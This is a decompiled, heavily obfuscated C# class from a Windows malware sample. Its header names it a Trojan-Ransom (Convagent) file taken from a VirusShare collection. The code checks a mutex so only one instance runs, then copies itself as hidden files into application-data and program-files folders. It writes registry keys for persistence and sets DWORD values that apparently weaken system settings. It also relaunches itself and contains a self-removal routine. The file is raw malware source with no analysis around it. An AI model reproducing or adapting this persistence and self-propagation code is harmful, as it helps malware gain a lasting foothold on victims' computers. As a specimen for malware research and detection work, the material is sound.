// Decompiled with JetBrains decompiler
// Type: *p.)<<
// Assembly: System, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DB18CA19-4EF7-467A-AA02-244B3B1B157A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\VHO-Trojan-Ransom.Win32.Convagent.gen-fe2473ff7e7507e98adf2d055102064f9ebc133096f412e3944dd0dbee2345d7.exe

using \u002Ap\u000C;
using \u002Ap\u000C.\u0019A\u0013\u001C\u000A\u000B.\u0001_\u008D\u0022;
using \u002Ap\u000C.\u0019A\u0013\u001C\u000A\u000B.h\u000F\u0020\u001B0;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace \u002Ap\u000C
{
  internal class \u0029\u003C\u003C\u001B : \u0011\u000A\u003BB\u001C
  {
    private static Mutex \u001CN\u007C\u0008\u0020\u002C;
    public static RegistryKey \u0008\u001F;

    public static void \u0019\u0001()
    {
      \u0034\u002Dy\u0029\u000B\u0023.\u0016N();
      if (string.Join(Convert.ToString(32), \u001DDd.\u0024I\u0008\u0015\u0025\u000C\u002B) == \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0012\u000Au())
      {
        Process.Start(\u0034\u002Dy\u0029\u000B\u0023.\u0010\u003E5W\u00259\u002B);
        Environment.Exit(0);
      }
      \u0029\u003C\u003C\u001B.\u0008\u001F = !\u0034\u002Dy\u0029\u000B\u0023.K\u0017h\u002E\u003B\u000B8\u0008 ? Registry.CurrentUser : Registry.LocalMachine;
      \u0034\u002Dy\u0029\u000B\u0023.\u0005\u0023[2] = \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u000E\u0016\u000C\u00171B() + new Guid(\u0034\u002Dy\u0029\u000B\u0023.uI).ToString().ToUpper() + \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0031\u002BZ\u0016\u0016\u0011();
      try
      {
        Registry.CurrentUser.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0018J\u001Eu\u0008(), true).DeleteSubKey(\u0034\u002Dy\u0029\u000B\u0023.\u0005\u0023[2]);
      }
      catch
      {
      }
      \u0029\u003C\u003C\u001B.\u000E\u0006\u0017\u0028\u000C\u0017();
      \u0029\u003C\u003C\u001B.\u001A\u000F\u000F\u0020\u0012B();
      \u0029\u003C\u003C\u001B.\u0007\u000D\u0019();
      \u0011\u000A\u003BB\u001C.\u0010\u0027W\u0027\u008C();
      G\u007B\u0026\u002Ai.\u0081kX\u0009\u0019();
      \u003571\u0017N3\u0022.\u0016\u0011();
    }

    private static void \u0007\u000D\u0019()
    {
      if (\u0034\u002Dy\u0029\u000B\u0023.K\u0017h\u002E\u003B\u000B8\u0008)
      {
        \u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E[0] = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0006\u000DV() + \u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E[0];
        \u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E[1] = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) + \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0006\u000DV() + \u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E[1];
      }
      else
      {
        \u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E[0] = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0006\u000DV() + \u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E[0];
        \u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E[1] = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0006\u000DV() + \u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E[1];
      }
      if (!\u0029\u003C\u003C\u001B.\u003D\u00292\u00040\u0006\u0027())
      {
        try
        {
          foreach (string str in \u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E)
          {
            if (!\u001AOk\u00245\u0023.\u002C\u0001b\u000D\u005B\u002C\u002C(str))
            {
              File.Copy(\u0034\u002Dy\u0029\u000B\u0023.\u0010\u003E5W\u00259\u002B, str);
              File.SetAttributes(str, FileAttributes.Hidden);
            }
          }
        }
        catch
        {
        }
        try
        {
          if (\u0029\u003C\u003C\u001B.\u0008\u001F.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u001F\u000F\u0013\u000B()) == null)
            \u0029\u003C\u003C\u001B.\u0008\u001F.CreateSubKey(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u001F\u000F\u0013\u000B());
          if (\u0029\u003C\u003C\u001B.\u0008\u001F.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0009VCf\u00286\u0019()) == null)
            \u0029\u003C\u003C\u001B.\u0008\u001F.CreateSubKey(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0009VCf\u00286\u0019());
          if (Registry.LocalMachine.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u001E\u0009M\u0019() + \u0034\u002Dy\u0029\u000B\u0023.\u0005\u0023[2]) == null)
            Registry.LocalMachine.CreateSubKey(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u001E\u0009M\u0019() + \u0034\u002Dy\u0029\u000B\u0023.\u0005\u0023[2]);
          \u0029\u003C\u003C\u001B.\u0008\u001F.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u001F\u000F\u0013\u000B(), true).SetValue(\u0034\u002Dy\u0029\u000B\u0023.\u0005\u0023[0], (object) \u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E[0]);
          \u0029\u003C\u003C\u001B.\u0008\u001F.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0009VCf\u00286\u0019(), true).SetValue(\u0034\u002Dy\u0029\u000B\u0023.\u0005\u0023[1], (object) \u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E[1]);
          using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u001E\u0009M\u0019() + \u0034\u002Dy\u0029\u000B\u0023.\u0005\u0023[2], true))
          {
            registryKey.SetValue(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0015\u002F(), (object) (\u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E[0] + \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0017x\u00274\u0022()));
            registryKey.SetValue(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0037\u0026R\u0007\u0001(), (object) 1, RegistryValueKind.DWord);
          }
        }
        catch
        {
        }
      }
      if (!(\u0034\u002Dy\u0029\u000B\u0023.\u0010\u003E5W\u00259\u002B != \u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E[0]))
        return;
      if (!(\u0034\u002Dy\u0029\u000B\u0023.\u0010\u003E5W\u00259\u002B != \u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E[1]))
        return;
      try
      {
        \u0029\u003C\u003C\u001B.\u001CN\u007C\u0008\u0020\u002C.Close();
        foreach (string fileName in \u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E)
          Process.Start(fileName, string.Empty);
      }
      catch
      {
      }
      Environment.Exit(0);
    }

    public static void \u0040\u002A\u00225\u000B5\u0019\u002F(string _param0)
    {
      \u0029\u003C\u003C\u001B.\u007B\u002C\u0001\u001A\u0011();
      if (!\u001AOk\u00245\u0023.\u0010\u0025m\u001A(_param0))
        Process.Start(\u0034\u002Dy\u0029\u000B\u0023.\u0010\u003E5W\u00259\u002B);
      Environment.Exit(0);
    }

    private static void \u007B\u002C\u0001\u001A\u0011()
    {
      \u0011\u000A\u003BB\u001C.\u001AL\u002D\u001C\u0018();
      try
      {
        \u0029\u003C\u003C\u001B.\u0008\u001F.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u001F\u000F\u0013\u000B(), true).DeleteValue(\u0034\u002Dy\u0029\u000B\u0023.\u0005\u0023[0]);
        \u0029\u003C\u003C\u001B.\u0008\u001F.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0009VCf\u00286\u0019(), true).DeleteValue(\u0034\u002Dy\u0029\u000B\u0023.\u0005\u0023[1]);
        Registry.LocalMachine.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0018J\u001Eu\u0008(), true).DeleteSubKey(\u0034\u002Dy\u0029\u000B\u0023.\u0005\u0023[2]);
      }
      catch
      {
      }
      try
      {
        foreach (string path in \u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E)
          File.Delete(path);
      }
      catch
      {
      }
      try
      {
        \u0029\u003C\u003C\u001B.\u001CN\u007C\u0008\u0020\u002C.Close();
      }
      catch
      {
      }
    }

    private static bool \u003D\u00292\u00040\u0006\u0027()
    {
      foreach (string str in \u0034\u002Dy\u0029\u000B\u0023.\u0029\u0019\u0005\u003E)
      {
        if (!\u001AOk\u00245\u0023.\u002C\u0001b\u000D\u005B\u002C\u002C(str))
          return false;
      }
      return true;
    }

    private static void \u001A\u000F\u000F\u0020\u0012B()
    {
      try
      {
        \u0029\u003C\u003C\u001B.\u0008\u001F.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u000F\u0012\u001F0(), true).SetValue(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u00101\u0023\u0029\u0008(), (object) \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0017Ji\u000F\u005EP\u000C(), RegistryValueKind.DWord);
        \u0029\u003C\u003C\u001B.\u0008\u001F.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u000F\u0012\u001F0(), true).SetValue(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0009g\u001F(), (object) \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u000B2\u0028K\u001B\u000Dci(), RegistryValueKind.DWord);
        \u0029\u003C\u003C\u001B.\u0008\u001F.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0018\u001F\u003D\u0024(), true).SetValue(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.U\u0020\u000B\u005D(), (object) \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u000B2\u0028K\u001B\u000Dci(), RegistryValueKind.DWord);
      }
      catch
      {
      }
    }

    private static void \u000E\u0006\u0017\u0028\u000C\u0017()
    {
      try
      {
        \u0029\u003C\u003C\u001B.\u001CN\u007C\u0008\u0020\u002C = new Mutex(true, \u0034\u002Dy\u0029\u000B\u0023.uI);
        \u0029\u003C\u003C\u001B.\u001CN\u007C\u0008\u0020\u002C.ReleaseMutex();
      }
      catch
      {
        Environment.Exit(0);
      }
    }
  }
}
